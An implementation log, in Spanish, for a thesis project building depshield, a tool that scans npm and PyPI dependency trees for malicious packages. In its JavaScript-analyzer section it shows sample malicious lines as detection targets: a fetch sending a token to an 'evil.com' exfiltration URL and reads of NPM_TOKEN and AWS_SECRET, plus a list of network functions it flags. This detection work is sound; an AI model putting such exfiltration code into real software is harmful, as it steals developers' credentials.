# Progreso de Implementación — TFG depshield

> **Autor:** Iván M.  
> **Universidad:** URJC — Grado en Ingeniería en Ciberseguridad  
> **Fecha de inicio:** 18 de marzo de 2026  
> **Última actualización:** 19 de marzo de 2026  
> **Repositorio:** [github.com/ivanml242/depshield](https://github.com/ivanml242/depshield)

---

## 1. Contexto del proyecto

El proyecto **depshield** es una herramienta CLI escrita en Python que analiza las dependencias de un proyecto de software (ecosistemas npm y PyPI) **antes de que el desarrollador ejecute `npm install` o `pip install`**. Su objetivo es detectar paquetes potencialmente maliciosos en toda la cadena de suministro, incluyendo dependencias transitivas.

### Problema que resuelve

Los ataques a la cadena de suministro de software se han duplicado en 2025. Técnicas como el *typosquatting*, *dependency confusion* y cuentas de mantenedores comprometidas permiten a los atacantes publicar paquetes maliciosos en registros públicos como npm y PyPI. Las herramientas existentes tienen carencias importantes:

- **npm audit / pip-audit:** Solo detectan vulnerabilidades conocidas (CVEs). No detectan paquetes maliciosos zero-day.
- **GuardDog (Datadog):** Analiza paquetes individuales con reglas Semgrep, pero no resuelve el árbol transitivo completo y es evasible con ofuscación básica.
- **Packj:** Audita paquetes uno a uno, no el proyecto completo. Requiere Linux.
- **Socket.dev:** Comercial y de código cerrado.

Ninguna herramienta existente combina: (1) resolución del árbol transitivo completo, (2) análisis estático comportamental del código fuente, (3) análisis de metadatos sospechosos, y (4) un modelo de scoring multi-señal.

### Arquitectura general

```
[package.json / requirements.txt]
            │
            ▼
   ┌─────────────────┐
   │   RESOLVERS      │  ← Consulta APIs gratuitas de npm/PyPI
   │  npm + pypi      │     Construye árbol transitivo de deps
   └────────┬─────────┘
            │
            ▼
   ┌─────────────────┐
   │   DOWNLOADER     │  ← Descarga código fuente (.tar.gz)
   │                  │     Extrae en directorio temporal
   └────────┬─────────┘
            │
            ▼
   ┌─────────────────┐
   │   ANALYZERS      │  ← 3 analizadores en paralelo:
   │  js + py + meta  │     - Estático JS (esprima AST)
   └────────┬─────────┘     - Estático Python (ast stdlib)
            │                - Metadatos (API registros)
            ▼
   ┌─────────────────┐
   │   SCORER         │  ← Pondera hallazgos por severidad
   │                  │     Clasifica: SAFE/LOW/MEDIUM/HIGH
   └────────┬─────────┘
            │
            ▼
   ┌─────────────────┐
   │   REPORT         │  ← Tabla en terminal (rich)
   │  table + json    │     + export JSON
   └──────────────────┘
```

### Stack técnico

| Componente | Tecnología |
|---|---|
| Lenguaje | Python 3.12 |
| CLI | click |
| Parsing JS | esprima (port Python) + fallback regex |
| Parsing Python | ast (módulo built-in) |
| HTTP | requests |
| Output terminal | rich (tablas con colores) |
| Testing | pytest + pytest-cov |
| APIs | registry.npmjs.org (gratis) y pypi.org/pypi/ (gratis) |
| Dataset validación | OpenSSF malicious-packages (+15.000 reportes OSV) |
| Benchmark | Comparativa directa con GuardDog |

---

## 2. Plan de implementación (12 pasos)

El desarrollo se estructura en 12 pasos secuenciales (PASO 0 a PASO 11), donde cada paso produce un módulo funcional, testeado e integrado con el anterior:

| Paso | Módulo | Descripción |
|---|---|---|
| 0 | Proyecto base | Estructura, pyproject.toml, CLI stub, git |
| 1 | npm resolver | Árbol transitivo de dependencias npm |
| 2 | PyPI resolver | Árbol transitivo de dependencias PyPI |
| 3 | Downloader | Descarga y extracción de código fuente |
| 4 | JS analyzer | Análisis estático AST de JavaScript |
| 5 | Python analyzer | Análisis estático AST de Python |
| 6 | Metadata analyzer | Análisis de metadatos sospechosos |
| 7 | Scorer + Report | Motor de puntuación y generación de informes |
| 8 | Scanner + CLI | Orquestador principal, caché, CLI completa |
| 9 | Tests integración | Validación contra paquetes maliciosos reales |
| 10 | Benchmark | Comparativa con GuardDog |
| 11 | Documentación | README, ARCHITECTURE.md, pulido final |

---

## 3. PASO 0 — Configuración del proyecto

**Objetivo:** Crear la estructura base del proyecto Python, configurar las dependencias, definir el punto de entrada de la CLI, e inicializar el control de versiones.

### 3.1. Estructura de directorios creada

```
depshield/
├── depshield/
│   ├── __init__.py          # Paquete principal, define __version__
│   └── cli.py               # Interfaz CLI con click
├── tests/
│   └── __init__.py
├── .venv/                   # Entorno virtual Python (no versionado)
├── .gitignore
├── pyproject.toml           # Configuración del proyecto (PEP 621)
└── README.md
```

### 3.2. Configuración del proyecto — `pyproject.toml`

Se utilizó el estándar **PEP 621** con `setuptools` como sistema de build, evitando herramientas como Poetry para mantener la simplicidad:

```toml
[build-system]
requires = ["setuptools>=68.0", "wheel"]
build-backend = "setuptools.build_meta"

[project]
name = "depshield"
version = "0.1.0"
requires-python = ">=3.11"

dependencies = [
    "requests",
    "click",
    "rich",
    "esprima",
]

[project.optional-dependencies]
dev = [
    "pytest",
    "pytest-cov",
]

[project.scripts]
depshield = "depshield.cli:main"
```

El campo `[project.scripts]` define el punto de entrada CLI: al instalar el paquete, se crea un ejecutable `depshield` que invoca la función `main()` de `depshield/cli.py`.

### 3.3. CLI inicial — `depshield/cli.py`

Se implementó un esqueleto funcional de la CLI usando **click** con la estructura de comandos que se irá completando en pasos posteriores:

```python
@click.group()
@click.version_option(version=__version__, prog_name="depshield")
def main():
    """depshield - Detect malicious dependencies before installation."""

@main.command()
@click.argument("path", default=".", type=click.Path(exists=True))
@click.option("--format", "output_format", type=click.Choice(["table", "json"]), default="table")
@click.option("--ecosystem", type=click.Choice(["npm", "pypi", "auto"]), default="auto")
@click.option("--no-cache", is_flag=True, default=False)
@click.option("--max-depth", type=int, default=3)
@click.option("--only-direct", is_flag=True, default=False)
def scan(path, output_format, ecosystem, no_cache, max_depth, only_direct):
    """Scan a project directory for malicious dependencies."""
    click.echo(f"depshield v{__version__}")
    click.echo(f"Scanning: {path}")
```

### 3.4. Entorno de desarrollo

Se creó un entorno virtual de Python y se instaló el proyecto en modo editable para desarrollo:

```powershell
python -m venv .venv
.\.venv\Scripts\python.exe -m pip install -e ".[dev]"
```

La instalación en modo editable (`-e`) permite que los cambios en el código fuente se reflejen inmediatamente sin necesidad de reinstalar. Las dependencias de desarrollo (`[dev]`) incluyen `pytest` y `pytest-cov`.

### 3.5. Verificación

```powershell
# Verificar que la CLI funciona
depshield --version        # → depshield, version 0.1.0
depshield scan .           # → Output de stub
depshield scan --help      # → Muestra todas las opciones

# Verificar que pytest funciona
pytest -v                  # → 0 tests (esperado en este paso)
```

### 3.6. Control de versiones

```powershell
git init
git add .
git commit -m "PASO 0: Initial project setup"
git remote add origin https://github.com/ivanml242/depshield.git
git branch -M main
git push -u origin main
```

---

## 4. PASO 1 — Resolución de dependencias npm

**Objetivo:** Crear un módulo capaz de leer un fichero `package.json`, consultar la API pública de npm, resolver las versiones según las restricciones semver, y construir el árbol completo de dependencias transitivas de forma recursiva.

### 4.1. Módulo creado: `depshield/resolvers/npm_resolver.py`

Se creó el subpaquete `depshield/resolvers/` con los ficheros:

```
depshield/resolvers/
├── __init__.py
└── npm_resolver.py
```

### 4.2. Modelo de datos — `DependencyNode`

Se definió una estructura de datos reutilizable (dataclass) que representa un nodo en el árbol de dependencias. Esta misma estructura será compartida por el resolver de PyPI en el PASO 2:

```python
@dataclass
class DependencyNode:
    name: str                                    # Nombre del paquete
    version: str                                 # Versión resuelta
    is_direct: bool = False                      # ¿Es dependencia directa del proyecto?
    children: list["DependencyNode"] = field(default_factory=list)  # Dependencias transitivas

    def flatten(self) -> list["DependencyNode"]:
        """Devuelve una lista plana de este nodo + todos sus descendientes."""
        result = [self]
        for child in self.children:
            result.extend(child.flatten())
        return result
```

### 4.3. Resolución semver

Se implementó un resolutor de semver básico pero funcional que cubre los formatos más comunes encontrados en el ecosistema npm:

| Formato | Ejemplo | Comportamiento |
|---|---|---|
| Exact | `1.2.3` | Coincidencia exacta |
| Caret (`^`) | `^1.2.3` | Permite cambios que no modifiquen el dígito más a la izquierda distinto de cero. Ej: `^1.2.3` acepta `>=1.2.3, <2.0.0` |
| Tilde (`~`) | `~1.2.3` | Permite cambios a nivel de patch. Ej: `~1.2.3` acepta `>=1.2.3, <1.3.0` |
| Greater-equal (`>=`) | `>=1.0.0` | Cualquier versión superior o igual |
| Rango | `>=1.0.0 <2.0.0` | Versiones dentro del rango especificado |
| OR (`\|\|`) | `^1 \|\| ^2` | Evalúa cada rama y devuelve la primera que produzca un match |
| Star/Latest | `*` o `latest` | Selecciona la versión estable más reciente |

La función `_best_match(versions, spec)` recibe la lista completa de versiones disponibles de un paquete y la especificación semver, y devuelve la versión más alta que satisface la restricción. Las versiones pre-release se filtran por defecto.

### 4.4. Cliente de la API de npm

Se implementó un cliente HTTP que consulta la API pública del registro de npm:

```
GET https://registry.npmjs.org/{package_name}
```

Este endpoint devuelve toda la metadata del paquete, incluyendo un campo `versions` que contiene, para cada versión publicada, sus propias dependencias en el campo `dependencies`.

Se implementó **rate limiting** para respetar los límites de la API (máximo ~1000 requests/hora):

```python
def _rate_limit() -> None:
    """Asegura al menos 1 segundo entre peticiones HTTP consecutivas."""
    global _last_request_time
    elapsed = time.time() - _last_request_time
    if elapsed < 1.0:
        time.sleep(1.0 - elapsed)
    _last_request_time = time.time()
```

### 4.5. Resolución recursiva del árbol

La función principal `resolve_tree()` construye el árbol de dependencias de forma recursiva:

```python
def resolve_tree(
    deps: dict[str, str],       # {"chalk": "^4.0.0", "minimist": "^1.2.0"}
    *,
    max_depth: int = 3,         # Profundidad máxima para evitar árboles enormes
    _visited: set[str] = None,  # Control de ciclos: "name@version" ya resueltos
    _depth: int = 0,            # Profundidad actual
    _is_direct: bool = True,    # ¿Nivel de dependencias directas?
) -> list[DependencyNode]:
```

**Algoritmo:**
1. Para cada dependencia en el diccionario de entrada:
   a. Consulta la API de npm para obtener todas las versiones disponibles.
   b. Usa `_best_match()` para resolver la versión que satisface la especificación semver.
   c. Comprueba si `name@version` ya está en el conjunto `_visited` (protección contra ciclos).
   d. Si no se ha visitado y la profundidad actual es menor que `max_depth`, extrae las dependencias transitivas del manifiesto de la versión resuelta y llama recursivamente a `resolve_tree()`.
2. Devuelve la lista de `DependencyNode` con sus hijos populados.

**Protección contra ciclos:** Se mantiene un conjunto global `_visited` con claves `"name@version"`. Si un paquete ya ha sido visitado, se añade como nodo hoja sin resolver sus hijos, evitando recursión infinita.

### 4.6. API pública del módulo

```python
# Lectura de package.json
def read_package_json(path) -> dict[str, str]:
    """Lee package.json y devuelve las dependencias + devDependencies fusionadas."""

# Resolución desde diccionario
def resolve_tree(deps, *, max_depth=3) -> list[DependencyNode]:
    """Resuelve recursivamente el árbol de dependencias."""

# Helper de alto nivel
def resolve_from_package_json(path, *, max_depth=3) -> list[DependencyNode]:
    """Lee package.json y resuelve el árbol completo en un solo paso."""
```

### 4.7. Verificación

Se crearon 19 tests unitarios y de integración que cubrieron:

| Categoría | Tests | Descripción |
|---|---|---|
| Semver | 11 | Exact, caret, tilde, gte, star, latest, OR, range, edge cases |
| package.json | 2 | Lectura con/sin devDependencies |
| DependencyNode | 2 | flatten(), repr() |
| Integración (red) | 4 | Resolución real de `minimist` (0 deps), `chalk` (deps transitivas), ciclos, end-to-end |

**Resultado:** 19/19 PASSED en 5.39 segundos.

Tras la verificación, los tests se eliminaron para mantener el proyecto limpio según las instrucciones del plan.

### 4.8. Commit

```powershell
git add .
git commit -m "PASO 1: npm dependency resolver with semver, rate limiting and cycle protection"
git push origin main
```

---

## 5. PASO 2 — Resolución de dependencias PyPI

**Objetivo:** Crear un módulo análogo al npm resolver, pero para el ecosistema Python. Debe ser capaz de leer un fichero `requirements.txt`, consultar la API pública de PyPI, parsear el campo `requires_dist` de cada paquete para determinar sus dependencias transitivas, y construir el árbol completo de forma recursiva.

### 5.1. Módulo creado: `depshield/resolvers/pypi_resolver.py`

Se añadió al subpaquete `depshield/resolvers/`:

```
depshield/resolvers/
├── __init__.py
├── npm_resolver.py       # ✅ PASO 1
└── pypi_resolver.py      # ✅ PASO 2
```

Se reutiliza el modelo de datos `DependencyNode` definido en el PASO 1 (`npm_resolver.py`), garantizando una interfaz uniforme entre ambos resolvers. Esto permite que los módulos posteriores (downloader, analyzers, scorer) trabajen con la misma estructura de datos independientemente del ecosistema.

### 5.2. Parser de `requirements.txt`

El fichero `requirements.txt` es el estándar de facto para declarar dependencias en proyectos Python. A diferencia de `package.json` (que es JSON estructurado), `requirements.txt` es un fichero de texto plano con una sintaxis más libre y variable. Se implementó un parser basado en expresiones regulares que soporta los formatos más comunes:

| Formato | Ejemplo | Interpretación |
|---|---|---|
| Nombre sin versión | `requests` | Se resolverá a la última versión estable |
| Pinned (fija) | `requests==2.31.0` | Versión exacta |
| Mínima | `requests>=2.20` | Cualquier versión ≥ 2.20 |
| Compatible release | `flask~=2.3` | Equivale a `>=2.3, ==2.*` (mismo major) |
| Comentarios | `# esto es un comentario` | Se ignoran |
| Flags de pip | `-e .` o `--index-url ...` | Se ignoran (líneas que empiezan con `-`) |

```python
_REQ_LINE_RE = re.compile(
    r"""
    ^
    \s*
    (?P<name>[A-Za-z0-9_][A-Za-z0-9._-]*)   # nombre del paquete
    \s*
    (?:
        (?P<op>~=|==|!=|>=|<=|>|<)           # operador de versión
        \s*
        (?P<version>[^\s;#,]+)               # string de versión
    )?
    """,
    re.VERBOSE,
)
```

### 5.3. API de PyPI

A diferencia de npm (que devuelve todo el catálogo de versiones en una sola petición), la API JSON de PyPI ofrece dos endpoints relevantes:

```
# Metadata general del paquete (incluye lista de todas las versiones publicadas)
GET https://pypi.org/pypi/{nombre}/json

# Metadata de una versión específica (incluye requires_dist con las dependencias)
GET https://pypi.org/pypi/{nombre}/{version}/json
```

Esto tiene una implicación directa en el rendimiento: para cada paquete se necesitan **dos peticiones HTTP** (una para conocer las versiones disponibles y otra para obtener las dependencias de la versión resuelta). En npm bastaba con una sola petición porque el campo `versions` del endpoint general ya incluye las dependencias de cada versión.

Se implementó el mismo mecanismo de **rate limiting** (1 segundo entre peticiones) del PASO 1 para respetar los límites de las APIs públicas.

### 5.4. Parser de `requires_dist`

El campo `requires_dist` de la API de PyPI es una lista de strings que describe las dependencias de un paquete. Su formato varía significativamente entre paquetes y versiones, lo que supuso el mayor reto técnico de este paso. Ejemplos reales encontrados:

```python
# Formato con paréntesis (paquetes antiguos)
"urllib3 (>=1.21.1,<3)"

# Formato sin paréntesis (paquetes modernos, ej. requests 2.33+)
"charset_normalizer<4,>=2"

# Dependencia opcional (extra) – debe ser IGNORADA
'PySocks (!=1.5.7,>=1.5.6) ; extra == "socks"'

# Dependencia sin versión
"certifi"
```

La regex del parser tuvo que actualizarse durante el desarrollo para soportar ambas variantes (con y sin paréntesis), ya que la primera versión solo manejaba el formato con paréntesis y fallaba al resolver las dependencias de paquetes como `requests@2.33.1`:

```python
_REQUIRES_DIST_RE = re.compile(
    r"""
    ^
    (?P<name>[A-Za-z0-9][A-Za-z0-9._-]*)
    \s*
    (?:
        \((?P<version_paren>[^)]*)\)                    # con paréntesis
        |
        (?P<version_bare>(?:[<>=!~]+[^;,\s]+           # sin paréntesis
            (?:\s*,\s*[<>=!~]+[^;,\s]+)*))
    )?
    (?:\s*;\s*(?P<marker>.*))?                          # marcadores de entorno
    $
    """,
    re.VERBOSE,
)
```

Las dependencias con marcadores de tipo `extra == "..."` se descartan porque representan dependencias opcionales que no se instalan por defecto (ej. `requests[socks]` instala `PySocks`, pero `pip install requests` a secas no lo hace).

### 5.5. Resolución de versiones

El ecosistema PyPI utiliza PEP 440 para la especificación de versiones, que difiere de semver (usado en npm). Se implementó un resolutor que cubre los operadores más frecuentes:

| Operador | Ejemplo | Significado |
|---|---|---|
| `==` | `==2.31.0` | Versión exacta |
| `!=` | `!=1.5.7` | Excluir una versión concreta |
| `>=` | `>=2.20` | Mínimo |
| `<=` | `<=3.0` | Máximo |
| `>` | `>1.0` | Estrictamente mayor |
| `<` | `<4.0` | Estrictamente menor |
| `~=` | `~=2.3` | Compatible release: `>=2.3, ==2.*` |
| Compuesto | `>=1.0,<2.0` | Múltiples restricciones separadas por coma |

A diferencia del PASO 1 (donde el resolutor se implementó en una sola función `_best_match()`), aquí se separó la lógica en dos funciones para manejar la complejidad de los especificadores compuestos:

- `_version_matches_single(version, spec)` → evalúa un solo operador.
- `_resolve_version(versions, spec)` → maneja especificadores compuestos (con coma), llamando a `_version_matches_single()` para cada parte.

### 5.6. Resolución recursiva del árbol

La función `resolve_tree()` sigue el mismo patrón que el PASO 1, con una diferencia clave: la **profundidad máxima por defecto es 5** (en lugar de 3 en npm). Esto se debe a que los árboles de dependencias en PyPI tienden a ser más profundos pero más estrechos que en npm.

```python
def resolve_tree(
    deps: dict[str, str],       # {"requests": ">=2.20", "six": ""}
    *,
    max_depth: int = 5,         # Mayor profundidad que npm (árboles más profundos)
    _visited: set[str] = None,  # Control de ciclos
    _depth: int = 0,
    _is_direct: bool = True,
) -> list[DependencyNode]:
```

**Algoritmo:**
1. Para cada dependencia en el diccionario de entrada:
   a. Primera petición HTTP: obtener todas las versiones disponibles del paquete (`GET /pypi/{name}/json` → campo `releases`).
   b. Aplicar `_resolve_version()` para seleccionar la versión que satisface el especificador.
   c. Comprobar el conjunto `_visited` (protección contra ciclos, idéntica al PASO 1).
   d. Segunda petición HTTP: obtener la metadata de la versión resuelta (`GET /pypi/{name}/{version}/json` → campo `info.requires_dist`).
   e. Parsear `requires_dist` con `_parse_requires_dist()`, descartando dependencias opcionales.
   f. Llamar recursivamente a `resolve_tree()` con las dependencias extraídas.
2. Devolver la lista de `DependencyNode` con hijos populados.

### 5.7. Diferencias clave entre el resolver npm y PyPI

| Aspecto | npm (PASO 1) | PyPI (PASO 2) |
|---|---|---|
| Fichero de entrada | `package.json` (JSON) | `requirements.txt` (texto plano) |
| API de registro | `registry.npmjs.org` | `pypi.org/pypi/` |
| Peticiones por paquete | 1 (todo en un endpoint) | 2 (versiones + metadata de versión) |
| Formato de versiones | semver (`^`, `~`, `*`, `\|\|`) | PEP 440 (`==`, `>=`, `~=`, compuestos) |
| Profundidad por defecto | 3 | 5 |
| Dependencias opcionales | No aplica | `requires_dist` con `extra ==` → se descartan |
| Modelo de datos | `DependencyNode` | `DependencyNode` (compartido) |

### 5.8. API pública del módulo

```python
# Lectura de requirements.txt
def read_requirements_txt(path) -> dict[str, str]:
    """Parsea requirements.txt y devuelve {nombre: especificador_version}."""

# Resolución desde diccionario
def resolve_tree(deps, *, max_depth=5) -> list[DependencyNode]:
    """Resuelve recursivamente el árbol de dependencias PyPI."""

# Helper de alto nivel
def resolve_from_requirements_txt(path, *, max_depth=5) -> list[DependencyNode]:
    """Lee requirements.txt y resuelve el árbol completo en un solo paso."""
```

### 5.9. Verificación

Se crearon 20 tests unitarios y de integración:

| Categoría | Tests | Descripción |
|---|---|---|
| requirements.txt | 4 | Pinned, bare name, comentarios/blancos, compatible release |
| requires_dist | 4 | Con paréntesis, sin paréntesis, filtrado de extras, lista vacía |
| Resolución versiones | 8 | Exact, gte, latest, compatible, compound, not-equal, gt, lt |
| Integración (red) | 4 | `six` (0 deps), `requests` (deps transitivas), ciclos, end-to-end |

**Resultado:** 20/20 PASSED en 11.31 segundos.

El test de `requests` fue especialmente revelador: en la primera ejecución falló porque `requests@2.33.1` usa el formato `requires_dist` sin paréntesis, lo que obligó a actualizar la regex del parser para soportar ambas variantes. Este tipo de incompatibilidad en el formato de los metadatos es un ejemplo real de las dificultades de trabajar con registros de paquetes públicos.

### 5.10. Commit

```powershell
git add .
git commit -m "PASO 2: PyPI dependency resolver with requires_dist parsing and cycle protection"
git push origin main
```

---

## 6. PASO 3 — Descarga de código fuente de paquetes

**Objetivo:** Crear un módulo capaz de descargar el código fuente de cualquier paquete (npm o PyPI) dado su nombre y versión, extraerlo en un directorio temporal para su análisis posterior, y limpiar los ficheros temporales una vez finalizado el proceso.

### 6.1. Módulo creado: `depshield/downloaders/package_downloader.py`

Se creó el subpaquete `depshield/downloaders/`:

```
depshield/downloaders/
├── __init__.py
└── package_downloader.py
```

Este módulo actúa como puente entre los resolvers (PASO 1 y 2) y los analizadores estáticos (PASO 4 y 5). Los resolvers proporcionan el nombre y la versión exacta de cada dependencia; el downloader descarga el código fuente para que los analizadores puedan inspeccionarlo.

### 6.2. Obtención de URLs de descarga

Cada ecosistema tiene su propia forma de exponer las URLs de descarga del código fuente:

**npm:** El endpoint `GET registry.npmjs.org/{name}` incluye, para cada versión, un campo `versions[version].dist.tarball` con la URL directa al fichero `.tgz`. Solo se necesita una petición HTTP.

```python
def _get_npm_tarball_url(name: str, version: str) -> str:
    url = f"https://registry.npmjs.org/{name}"
    data = requests.get(url).json()
    return data["versions"][version]["dist"]["tarball"]
```

**PyPI:** El endpoint `GET pypi.org/pypi/{name}/{version}/json` devuelve un campo `urls` que es una lista de distribuciones disponibles. Un paquete puede tener múltiples formatos de distribución. Se implementó una estrategia de prioridad con fallback:

1. **sdist** (`.tar.gz`) → preferido, contiene el código fuente original
2. **Archivo `.zip`** → alternativa equivalente
3. **wheel** (`.whl`) → último recurso (es un zip con código ya procesado)

```python
def _get_pypi_sdist_url(name: str, version: str) -> str | None:
    data = requests.get(f"https://pypi.org/pypi/{name}/{version}/json").json()
    for entry in data["urls"]:
        if entry["packagetype"] == "sdist":    # Preferido
            return entry["url"]
    for entry in data["urls"]:
        if entry["filename"].endswith((".tar.gz", ".zip")):  # Fallback
            return entry["url"]
    for entry in data["urls"]:
        if entry["packagetype"] == "bdist_wheel":  # Último recurso
            return entry["url"]
    return None
```

### 6.3. Extracción segura de archivos

La extracción de archivos descargados de Internet es un vector de ataque conocido (CVE-2007-4559, "path traversal via tarball"). Un atacante puede incluir en un `.tar.gz` ficheros con rutas como `../../../etc/passwd` que, al extraerse, sobrescriben ficheros fuera del directorio de destino.

Se implementaron dos medidas de seguridad:

1. **Filtrado de miembros:** Antes de extraer, se descartan todos los miembros cuyo nombre empiece por `/` (ruta absoluta) o contenga `..` (path traversal).
2. **Filtro `data` de Python 3.12+:** Se usa `tar.extractall(filter="data")`, que es el mecanismo nativo de Python para extracción segura (descarta permisos especiales, dispositivos, symlinks peligrosos, etc.).

```python
def _download_and_extract(download_url: str, dest_dir: str) -> Path:
    content = requests.get(download_url).content

    if download_url.endswith((".tar.gz", ".tgz")):
        with tarfile.open(fileobj=io.BytesIO(content), mode="r:gz") as tar:
            members = [
                m for m in tar.getmembers()
                if not m.name.startswith("/") and ".." not in m.name
            ]
            tar.extractall(path=dest, members=members, filter="data")

    elif download_url.endswith((".zip", ".whl")):
        with zipfile.ZipFile(io.BytesIO(content)) as zf:
            safe_names = [
                n for n in zf.namelist()
                if not n.startswith("/") and ".." not in n
            ]
            for name in safe_names:
                zf.extract(name, path=dest)
```

### 6.4. Clase `PackageDownloader`

Se diseñó una clase que encapsula todo el flujo de descarga y proporciona gestión automática del ciclo de vida de los ficheros temporales:

```python
class PackageDownloader:
    def __init__(self):
        self._temp_dirs: list[str] = []

    def download(self, name: str, version: str, *, ecosystem: str) -> Path:
        """Descarga y extrae el código fuente. Devuelve la ruta al directorio."""
        temp_dir = tempfile.mkdtemp(prefix=f"depshield_{name}_{version}_")
        self._temp_dirs.append(temp_dir)
        url = ...  # Según el ecosistema
        _download_and_extract(url, temp_dir)
        return Path(temp_dir)

    def cleanup(self):
        """Borra todos los directorios temporales creados."""
        for d in self._temp_dirs:
            shutil.rmtree(d, ignore_errors=True)
        self._temp_dirs.clear()
```

La clase también implementa el protocolo de **context manager** de Python (`__enter__` / `__exit__`), lo que permite usar la sintaxis `with` para garantizar que los temporales se limpian automáticamente incluso si ocurre una excepción:

```python
with PackageDownloader() as dl:
    src_dir = dl.download("is-odd", "3.0.1", ecosystem="npm")
    # ... analizar ficheros en src_dir ...
# Al salir del bloque 'with', se llama automáticamente a dl.cleanup()
```

### 6.5. Flujo completo: resolver → downloader

Ejemplo de integración de los tres primeros módulos:

```python
from depshield.resolvers.npm_resolver import resolve_from_package_json
from depshield.downloaders.package_downloader import PackageDownloader

# PASO 1: Resolver el árbol de dependencias
nodes = resolve_from_package_json("package.json", max_depth=2)

# PASO 3: Descargar el código fuente de cada dependencia
with PackageDownloader() as dl:
    for node in nodes[0].flatten():
        src_dir = dl.download(node.name, node.version, ecosystem="npm")
        print(f"Descargado {node.name}@{node.version} → {src_dir}")
        # PASO 4/5: Aquí irán los analizadores estáticos
```

### 6.6. Verificación

Se crearon 7 tests de integración que descargaron paquetes reales:

| Categoría | Tests | Descripción |
|---|---|---|
| URL resolution | 2 | Obtener URL del tarball de npm (`is-odd`) y sdist de PyPI (`six`) |
| Descarga + extracción | 2 | Descargar y verificar que se extraen ficheros reales (package.json para npm, .py para PyPI) |
| Cleanup | 2 | Verificar que `cleanup()` y el context manager borran los temporales |
| Múltiples descargas | 1 | Descargar npm + PyPI simultáneamente, verificar que son directorios distintos |

**Resultado:** 7/7 PASSED en 4.63 segundos.

Se detectó y corrigió un `DeprecationWarning` de Python 3.14 relacionado con `tarfile.extractall()`: se añadió el parámetro `filter="data"` para usar el nuevo mecanismo de extracción segura nativo.

### 6.7. Commit

```powershell
git add .
git commit -m "PASO 3: Package downloader for npm tarballs and PyPI sdists with safe extraction"
git push origin main
```

---

## 7. PASO 4 — Analizador estático de JavaScript

**Objetivo:** Crear un módulo capaz de analizar el código fuente JavaScript de cualquier paquete npm, buscando patrones de comportamiento sospechoso que puedan indicar actividad maliciosa. El análisis se realiza sin ejecutar el código, mediante inspección del Árbol de Sintaxis Abstracta (AST) generado por el parser `esprima`.

### 7.1. Módulo creado: `depshield/analyzers/js_analyzer.py`

Se creó el subpaquete `depshield/analyzers/`:

```
depshield/analyzers/
├── __init__.py
└── js_analyzer.py
```

Este módulo es el primero de los tres analizadores del pipeline (JS, Python, metadatos). Recibe la ruta a un directorio con código fuente JavaScript (proporcionada por el downloader del PASO 3) y devuelve una lista de hallazgos (*findings*) estructurados.

### 7.2. Modelo de datos — `Finding`

Se definió un dataclass que representa un hallazgo individual en el código fuente:

```python
@dataclass
class Finding:
    signal_type: str       # Tipo de señal: "NETWORK_CALLS", "CODE_EXECUTION", etc.
    severity: str          # "HIGH", "MEDIUM" o "LOW"
    file: str              # Ruta relativa al fichero
    line: int              # Número de línea (1-based, 0 si desconocido)
    snippet: str           # Fragmento de código relevante (máx 100 caracteres)
```

Este modelo será compartido por los analizadores de Python (PASO 5) y metadatos (PASO 6), garantizando una interfaz uniforme para el scorer (PASO 7).

### 7.3. Estrategia de análisis: AST + regex fallback

El análisis se implementó con una estrategia de **doble capa**:

1. **Capa primaria — Esprima AST:** Se parsea el fichero JavaScript con la librería `esprima` (port Python del parser de referencia de ECMAScript). El AST resultante se recorre recursivamente buscando nodos específicos que indiquen comportamiento sospechoso. Esto proporciona detección precisa con contexto semántico.

2. **Capa de fallback — Regex:** Si `esprima` no puede parsear el fichero (por ejemplo, por usar sintaxis JSX, TypeScript, optional chaining `?.`, o ECMAScript 2020+), se captura la excepción y se aplica un conjunto de expresiones regulares que buscan los mismos patrones sobre el código fuente como texto plano. Esto sacrifica precisión a cambio de cobertura.

```python
def analyze_file(filepath, source=None) -> list[Finding]:
    try:
        import esprima
        ast = esprima.parseScript(source, loc=True, tolerant=True)
        tree = ast.toDict()
        # Análisis AST preciso sobre el árbol
        findings = []
        findings.extend(_check_network_ast(tree, ...))
        findings.extend(_check_env_ast(tree, ...))
        # ... (6 señales)
        return findings
    except Exception:
        # esprima falló → fallback a regex
        return _analyze_with_regex(source, filepath)
```

### 7.4. Recorrido del AST

Para inspeccionar el AST, se implementó una función recursiva `_walk_ast()` que genera todos los nodos del árbol en preorden. Cada nodo es un diccionario con un campo `type` que indica su clase (ej. `CallExpression`, `MemberExpression`, `Literal`, `NewExpression`).

```python
def _walk_ast(node: dict) -> list[dict]:
    """Recorre recursivamente todos los nodos del AST."""
    nodes = [node]
    for value in node.values():
        if isinstance(value, dict):
            nodes.extend(_walk_ast(value))
        elif isinstance(value, list):
            for item in value:
                if isinstance(item, dict):
                    nodes.extend(_walk_ast(item))
    return nodes
```

Complementariamente, `_get_node_name()` extrae un nombre legible de un nodo `callee`, resolviendo cadenas de `MemberExpression` como `child_process.exec` a partir de los nodos anidados `object` → `property`.

### 7.5. Las 6 señales de comportamiento malicioso

#### Señal 1: NETWORK_CALLS — Llamadas de red

Detecta intentos de comunicación con servidores externos, lo que puede indicar exfiltración de datos o descarga de payloads.

**Detección AST:**
- Nodos `CallExpression` cuyo `callee` sea: `fetch`, `XMLHttpRequest`, `http.request`, `http.get`, `https.request`, `https.get`, `axios`, `axios.get`, `axios.post`, `request`, `got`, `got.get`, `node-fetch`.
- Nodos `Literal` (strings) que coincidan con el patrón `https?://` (URLs embebidas).

**Severidad:**
- `HIGH` para llamadas directas a funciones de red.
- `MEDIUM` para URL literals (pueden ser legítimas, ej. documentación).

**Ejemplo detectado:**
```javascript
// HIGH: llamada directa a fetch
fetch("https://evil.com/exfil?data=" + token);

// MEDIUM: URL literal
var api = "https://malicious-c2.com/data";
```

#### Señal 2: ENV_ACCESS — Acceso a variables de entorno

Detecta accesos a `process.env` y `process.argv`, que pueden usarse para robar tokens, API keys u credenciales almacenadas en el entorno del desarrollador.

**Detección AST:**
- Nodos `MemberExpression` cuyo nombre resuelto sea `process.env` o `process.argv`.

**Severidad:** `HIGH` — el acceso a variables de entorno en un paquete de utilidad es altamente sospechoso.

**Ejemplo detectado:**
```javascript
var token = process.env.NPM_TOKEN;    // HIGH: roba el token de npm
var secret = process.env.AWS_SECRET;  // HIGH: roba credenciales de AWS
```

#### Señal 3: FILE_SENSITIVE — Acceso a ficheros sensibles

Detecta accesos a rutas del sistema de ficheros que contienen credenciales, claves SSH o configuraciones sensibles.

**Detección AST:**
